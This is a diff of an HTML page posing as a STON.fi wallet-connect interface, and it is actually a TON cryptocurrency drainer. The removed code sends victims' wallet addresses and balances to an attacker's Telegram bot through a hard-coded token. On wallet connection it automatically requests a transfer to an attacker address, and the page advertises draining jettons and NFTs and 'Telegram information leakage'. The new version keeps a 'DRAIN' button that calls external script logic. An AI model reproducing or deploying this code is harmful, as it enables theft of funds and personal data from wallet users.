@@ -1,158 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>STON.fi Connect Wallet</title>
+    
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
 </head>
 <body>
-    <h1>STON.fi Connect Wallet Interface</h1>
-    <p>
-        Fully transparent work, full sources. <br>
-        Community of buyers, constant support. <br>
-        As a gift are a few popular offers!
-    </p>
-    <h2>Supported Wallets:</h2>
-    <ul>
-        <li>Tonkeeper</li>
-        <li>TG Wallet</li>
-        <li>TonHub</li>
-        <li>MyTonWallet</li>
-        <li>DeWallet</li>
-        <li>Bitget Wallet</li>
-        <li>TonWallet</li>
-        <li>XTONWallet</li>
-        <li>OpenMask</li>
-        <li>SafePal</li>
-        <li>OKX Wallet</li>
-        <li>HOT</li>
-    </ul>
 
-    <h2>Available Functions:</h2>
-    <ul>
-        <li>Transfer Ton</li>
-        <li>Transfer Jetton (4 assets for 1 signature)</li>
-        <li>Transfer NFT (4 assets for 1 signature, anonymous numbers and usernames included)</li>
-        <li>Telegram information leakage</li>
-    </ul>
 
-    <h3>v0.8.5 Updates:</h3>
-    <ul>
-        <li>The operation of the NFT scan has been changed again</li>
-        <li>Token evaluation system has been redesigned</li>
-        <li>Marked as scam NFTs are eliminated</li>
-        <li>Speeded up the work</li>
-        <li>Price is determined by AVG</li>
-        <li>Redesigned scam in a more pleasing for the eye look</li>
-        <li>Fixed minor bugs and errors</li>
-    </ul>
 
-    <div id="ton-connect"></div> <!-- Connect Wallet Button -->
-    <button id="drain-button" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
+<div id="ton-connect"></div>  <!--Connect Wallet-->
+<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Request for a coin transfer-->
 
-    <script>
-        // Static tonconnect-manifest.json URL instead of dynamic creation
-        const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
-        
-        // Telegram Bot Configurations
-        const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
-        const tgChatId = '5107144356'; // Replace with your Telegram chat ID
 
-        // Function to send messages to Telegram
-        async function sendTelegramMessage(message) {
-            try {
-                const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
-                const response = await fetch(telegramUrl, { method: 'GET' });
-                if (!response.ok) {
-                    console.error('Failed to send message to Telegram:', response.statusText);
-                }
-            } catch (error) {
-                console.error('Error sending message to Telegram:', error);
-            }
-        }
 
-        // Initialize TonConnect with manifest URL
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: manifestUrl,
-            buttonRootId: 'ton-connect'
-        });
 
-        let connectedWallet = null;
+<script src="tonsdk.js"></script>
+ 
+    
 
-        // Event listener for wallet connection
-        tonConnectUI.onStatusChange(async (walletInfo) => {
-            if (walletInfo && walletInfo.account) {
-                connectedWallet = walletInfo.account;
-                const message = `Wallet connected: ${walletInfo.account.address}`;
-                await sendTelegramMessage(message);
-                await checkBalance(walletInfo.account.address);
-                // Automatically initiate transfer when wallet is connected
-                // Only attempt the transfer if there is a valid wallet
-                if (connectedWallet) {
-                    await didtrans();
-                }
-            } else {
-                console.error('No account connected or status not recognized.');
-            }
-        });
 
-        // Function to check user balance and send it to Telegram
-        async function checkBalance(walletAddress) {
-            try {
-                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
-                const data = await response.json();
-                if (data && data.result) {
-                    const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
-                    const balanceMessage = `➖ Нет средств на подключенном кошельке мамонта #no_money
- └ 🌐 Домен: market.x-empire.org
- └ 💵 Баланс кошелька: ${balance} TON
- └ 💎 Требуется: 0.11 TON
- └ 🇪🇪 EE ${walletAddress}
- └ 📱 Кошелек: tonkeeper
- └ 🖱️ Платформа: iphone
- └ 👝 Адрес: ${walletAddress}`;
-                    await sendTelegramMessage(balanceMessage);
-                } else {
-                    console.error('Failed to fetch balance');
-                }
-            } catch (error) {
-                console.error('Error fetching balance:', error);
-            }
-        }
 
-        // Function to transfer TON and NFTs
-        async function didtrans() {
-            console.log('Attempting to send transaction... Please wait.');
-            try {
-                if (!connectedWallet) {
-                    console.error('Wallet is not connected. Cannot proceed with transaction.');
-                    return;
-                }
-
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
-                    messages: [
-                        {
-                            address: 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c', // Replace with your wallet address
-                            amount: 5000000 // Replace with the appropriate amount (in nanotons)
-                        }
-                    ]
-                };
-
-                // Send transaction
-                await tonConnectUI.sendTransaction(transaction);
-                const transactionMessage = 'Transaction sent successfully.';
-                await sendTelegramMessage(transactionMessage);
-            } catch (error) {
-                const errorMessage = `Failed to send transaction: ${error.message || error}`;
-                await sendTelegramMessage(errorMessage);
-            }
-        }
-
-        // Event listener for the DRAIN button
-        document.getElementById('drain-button').addEventListener('click', async () => {
-            await didtrans();
-        });
-    </script>
 </body>
+
+
 </html>
